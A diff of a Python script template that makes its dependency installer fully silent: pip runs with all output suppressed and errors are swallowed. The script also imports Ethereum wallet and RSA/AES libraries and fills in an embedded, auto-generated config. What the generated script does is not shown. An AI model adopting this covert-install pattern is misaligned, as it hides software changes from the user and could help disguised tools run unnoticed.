@@ -54,48 +54,88 @@ import subprocess
 import platform
 from pathlib import Path
 
-# Check and install dependencies silently
-def check_dependencies():
-    """Check and install required packages silently"""
-    required = ['web3', 'cryptography', 'pycryptodome', 'eth-account']
+# Silent dependency installer - handles all errors
+def install_dependencies_silent():
+    """Silently install dependencies without any user interaction"""
+    import subprocess
+    import sys
+    
+    # Packages with fallback versions for compatibility
+    packages = [
+        'web3>=6.0.0',
+        'eth-account>=0.8.0',
+        'cryptography>=40.0.0',
+        'pycryptodome>=3.15.0'
+    ]
+    
+    # Check what's missing
     missing = []
-    
-    for package in required:
+    for pkg in ['web3', 'eth_account', 'cryptography', 'Crypto']:
         try:
-            if package == 'pycryptodome':
-                import Crypto
-            elif package == 'eth-account':
-                import eth_account
-            else:
-                __import__(package)
+            __import__(pkg)
         except ImportError:
-            missing.append(package)
+            missing.append(pkg)
     
-    if missing:
-        print(f"Installing dependencies: {{', '.join(missing)}}")
-        try:
-            subprocess.check_call(
-                [sys.executable, '-m', 'pip', 'install', '--quiet', '--disable-pip-version-check'] + missing,
+    if not missing:
+        return True  # All installed
+    
+    # Try to install silently
+    try:
+        # Use --only-binary to avoid compilation
+        cmd = [
+            sys.executable, '-m', 'pip', 'install',
+            '--quiet', '--disable-pip-version-check',
+            '--only-binary=:all:',  # Only use pre-compiled wheels
+            '--prefer-binary'
+        ] + packages
+        
+        subprocess.run(
+            cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=120,
+            check=False  # Don't raise on error
+        )
+        
+        # If that fails, try without --only-binary
+        if missing:
+            cmd2 = [
+                sys.executable, '-m', 'pip', 'install',
+                '--quiet', '--disable-pip-version-check',
+                '--prefer-binary'
+            ] + packages
+            
+            subprocess.run(
+                cmd2,
                 stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
+                timeout=120,
+                check=False
             )
-            print("Dependencies installed successfully")
-        except Exception as e:
-            print(f"Error installing dependencies: {{e}}")
-            print("Please install manually: pip install web3 cryptography pycryptodome eth-account")
-            sys.exit(1)
+        
+        return True
+        
+    except Exception:
+        # If all fails, continue anyway - might work with system packages
+        return False
 
-# Install dependencies before importing
-check_dependencies()
+# Try to install dependencies silently (no errors shown)
+install_dependencies_silent()
 
-# Now import the dependencies
-from web3 import Web3
-from eth_account import Account
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+# Now import the dependencies (with fallback)
+try:
+    from web3 import Web3
+    from eth_account import Account
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa, padding
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from Crypto.Cipher import AES
+    from Crypto.Random import get_random_bytes
+except ImportError as e:
+    # If imports still fail, show minimal error and exit
+    import sys
+    print(f"Missing dependency. Please run: pip install web3 eth-account cryptography pycryptodome")
+    sys.exit(1)
 
 # Embedded configuration (auto-generated)
 EMBEDDED_CONFIG = {json.dumps(config, indent=4)}
